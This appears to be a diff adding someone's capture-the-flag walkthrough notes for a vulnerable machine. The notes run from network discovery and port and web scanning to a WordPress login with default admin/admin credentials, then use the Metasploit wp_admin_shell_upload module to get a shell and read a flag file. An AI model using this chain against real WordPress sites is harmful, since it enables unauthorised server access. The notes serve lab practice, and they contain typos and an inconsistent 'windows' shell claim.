@@ -1,0 +1,33 @@
+* sudo netdiscover
+  - FOUND ip address of the machine
+  
+* namp -v -sS -T4 <IP>
+  - FOUND 22, 110, 443, 139, 995 143, 993, 53 open ports
+  
+* dirb http://<IP>
+  - tons of unrelivent stuff, AKA rabbit holes
+ 
+* nkito -h <IP>
+  - FOUND "entry '/wordpress/' in robots.txt (intresting)
+  
+* <IP>/robots.txt
+  - FOUND dissallow: Hackers
+  - FOUND Allow: /worpress/
+  
+* <IP>/wordpress/
+  - login -> username = admin, password = admin 
+  - plugins -> editor -> php code (attack surface?)
+  
+* use exploit/unix/webapp/wp_admin_shell_upload
+  * set password admin
+  * set username admin
+  * set targeturi wordpress
+  * set rhost <IP>
+  * exploit
+  - this got a interactive windows OS shell
+  
+* whoami 
+  - just to check it is a working schell
+  
+* ls -> cd /home -> ls -> cd wpadmin -> ls -> cat flag.txt
+  
